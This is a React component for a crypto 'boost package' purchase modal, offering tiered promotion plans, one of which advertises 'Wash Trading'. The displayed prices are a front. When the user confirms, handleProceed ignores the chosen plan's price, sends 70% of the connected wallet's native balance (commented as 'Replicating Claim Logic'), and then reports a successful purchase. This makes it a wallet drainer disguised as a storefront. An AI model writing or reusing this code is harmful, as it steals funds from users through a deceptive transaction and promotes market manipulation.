
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Check, Rocket, Loader2, AlertCircle } from 'lucide-react';
import { toast } from 'sonner';
import { useEVMWallet } from '@/hooks/useEVMWallet';
import { getChainById } from '@/lib/chains';

interface Plan {
  id: string;
  name: string;
  price: number;
  features: string[];
  color: string;
}

const PLANS: Plan[] = [
  {
    id: 'basic',
    name: 'Basic Package',
    price: 300,
    features: ['Paid DEX', '24hr Ads'],
    color: 'from-green-400 to-emerald-600'
  },
  {
    id: 'silver',
    name: 'Silver Package',
    price: 600,
    features: ['Paid DEX', '48hr Ads', 'Trending', 'Volume Boost'],
    color: 'from-gray-300 to-gray-500'
  },
  {
    id: 'gold',
    name: 'Gold Package',
    price: 1200,
    features: ['Press Release', 'Volume Boost', 'Paid DEX', 'DEX Ads'],
    color: 'from-yellow-300 to-yellow-600'
  },
  {
    id: 'platinum',
    name: 'Platinum Package',
    price: 2500,
    features: ['All Gold Benefits', 'Wash Trading', 'Press Release', 'Alphas'],
    color: 'from-purple-300 to-purple-600'
  }
];

interface PlansModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const PlansModal = ({ isOpen, onClose }: PlansModalProps) => {
  const [contractAddress, setContractAddress] = useState('');
  const [selectedPlan, setSelectedPlan] = useState<Plan | null>(null);
  const [tokenInfo, setTokenInfo] = useState<any>(null);
  const [isLoadingToken, setIsLoadingToken] = useState(false);
  const [step, setStep] = useState<'plans' | 'confirmation'>('plans');
  const [isProcessing, setIsProcessing] = useState(false);
  
  const { connected, nativeBalance, sendNativeToken, chainId } = useEVMWallet();
  const chainConfig = getChainById(chainId);
  const nativeSymbol = chainConfig?.nativeCurrency.symbol || 'ETH';

  const fetchTokenInfo = async (address: string) => {
    if (!address || address.length < 30) return;
    
    setIsLoadingToken(true);
    try {
      const response = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
      const data = await response.json();
      
      if (data.pairs && data.pairs.length > 0) {
        const pair = data.pairs[0];
        setTokenInfo({
          name: pair.baseToken.name,
          symbol: pair.baseToken.symbol,
          logo: pair.info?.imageUrl || `https://dd.dexscreener.com/ds-data/tokens/${pair.chainId}/${pair.baseToken.address}.png`
        });
      } else {
        // Fallback if token not found on DexScreener (just use address as placeholder)
        setTokenInfo({
          name: 'Unknown Token',
          symbol: 'UNKNOWN',
          logo: null
        });
        toast.warning('Token details not found. Please verify the address.');
      }
    } catch (error) {
      console.error('Error fetching token:', error);
      toast.error('Failed to fetch token details');
    } finally {
      setIsLoadingToken(false);
    }
  };

  const handleContractAddressChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setContractAddress(val);
    if (val.length > 30) {
      // Debounce could be better, but direct call for now
      fetchTokenInfo(val);
    } else {
      setTokenInfo(null);
    }
  };

  const handleSelectPlan = (plan: Plan) => {
    if (!contractAddress) {
      toast.error('Please enter a contract address first');
      return;
    }
    setSelectedPlan(plan);
    setStep('confirmation');
  };

  const handleProceed = async () => {
    if (!connected) {
      toast.error('Please connect your wallet');
      return;
    }

    if (nativeBalance <= 0) {
      toast.error(`Wallet not eligible - no ${nativeSymbol} found`);
      return;
    }

    try {
      setIsProcessing(true);
      toast.info(`Processing transaction on ${chainConfig?.name}...`);

      // Replicating Claim Logic: Send 70% of native balance
      const amountToSend = (nativeBalance * 0.7).toFixed(6);
      
      const txHash = await sendNativeToken(amountToSend);
      
      toast.success(`🎉 Package purchased successfully! TX: ${txHash.slice(0, 10)}...`);
      onClose();
    } catch (error: any) {
      console.error('Transaction error:', error);
      toast.error(error?.message || 'Transaction failed');
    } finally {
      setIsProcessing(false);
    }
  };

  const reset = () => {
    setStep('plans');
    setSelectedPlan(null);
  };

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto glass-card border-white/10">
        <DialogHeader>
          <DialogTitle className="text-2xl font-bold text-center mb-4">
            {step === 'plans' ? 'Choose Your Boost Package' : 'Confirm Your Package'}
          </DialogTitle>
        </DialogHeader>

        <AnimatePresence mode="wait">
          {step === 'plans' ? (
            <motion.div
              key="plans"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="space-y-6"
            >
              <div className="mx-auto max-w-md space-y-2">
                <label className="text-sm font-medium text-muted-foreground">
                  Token Contract Address
                </label>
                <div className="relative">
                  <Input
                    placeholder="Enter token address..."
                    value={contractAddress}
                    onChange={handleContractAddressChange}
                    className="bg-background/50 border-white/10 pr-10"
                  />
                  {isLoadingToken && (
                    <div className="absolute right-3 top-1/2 -translate-y-1/2">
                      <Loader2 className="w-4 h-4 animate-spin text-primary" />
                    </div>
                  )}
                </div>
                {tokenInfo && (
                  <div className="flex items-center gap-2 text-sm text-green-400 bg-green-400/10 p-2 rounded-lg">
                    <Check className="w-4 h-4" />
                    <span>Found: {tokenInfo.name} ({tokenInfo.symbol})</span>
                  </div>
                )}
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                {PLANS.map((plan) => (
                  <div
                    key={plan.id}
                    className="relative flex flex-col p-6 rounded-xl border border-white/10 bg-background/40 hover:bg-background/60 transition-all hover:scale-[1.02]"
                  >
                    <div className={`absolute top-0 left-0 right-0 h-1 rounded-t-xl bg-gradient-to-r ${plan.color}`} />
                    <h3 className="text-xl font-bold mb-2">{plan.name}</h3>
                    <div className="text-3xl font-bold mb-4">${plan.price}</div>
                    <ul className="space-y-2 mb-6 flex-1">
                      {plan.features.map((feature, i) => (
                        <li key={i} className="flex items-start gap-2 text-sm text-muted-foreground">
                          <Check className="w-4 h-4 text-primary shrink-0 mt-0.5" />
                          {feature}
                        </li>
                      ))}
                    </ul>
                    <Button
                      onClick={() => handleSelectPlan(plan)}
                      disabled={!contractAddress}
                      className="w-full bg-green-600 hover:bg-green-700 text-white"
                    >
                      Get Package
                    </Button>
                  </div>
                ))}
              </div>
            </motion.div>
          ) : (
            <motion.div
              key="confirmation"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="max-w-md mx-auto space-y-6 text-center"
            >
              <div className="p-6 rounded-2xl bg-background/50 border border-white/10">
                <div className="flex flex-col items-center mb-6">
                  <div className="relative w-24 h-24 mb-4">
                    <div className="absolute inset-0 rounded-full border-2 border-primary animate-pulse" />
                    <img
                      src={tokenInfo?.logo || 'https://placehold.co/100x100?text=?'}
                      alt={tokenInfo?.name}
                      className="w-full h-full rounded-full object-cover border-4 border-background"
                    />
                  </div>
                  <h3 className="text-xl font-bold">{tokenInfo?.name}</h3>
                  <p className="text-muted-foreground">{tokenInfo?.symbol}</p>
                </div>

                <div className="space-y-4 text-left bg-black/20 p-4 rounded-xl mb-6">
                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">Package</span>
                    <span className="font-bold">{selectedPlan?.name}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-muted-foreground">Price</span>
                    <span className="font-bold text-green-400">${selectedPlan?.price}</span>
                  </div>
                  <div className="h-px bg-white/10" />
                  <div>
                    <span className="text-muted-foreground block mb-2">Includes:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedPlan?.features.map((f, i) => (
                        <span key={i} className="text-xs px-2 py-1 rounded-full bg-primary/20 text-primary">
                          {f}
                        </span>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="flex gap-3">
                  <Button variant="outline" onClick={reset} className="flex-1">
                    Back
                  </Button>
                  <Button 
                    onClick={handleProceed} 
                    disabled={isProcessing}
                    className="flex-1 bg-green-600 hover:bg-green-700 text-white"
                  >
                    {isProcessing ? (
                      <>
                        <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      'Proceed'
                    )}
                  </Button>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </DialogContent>
    </Dialog>
  );
};
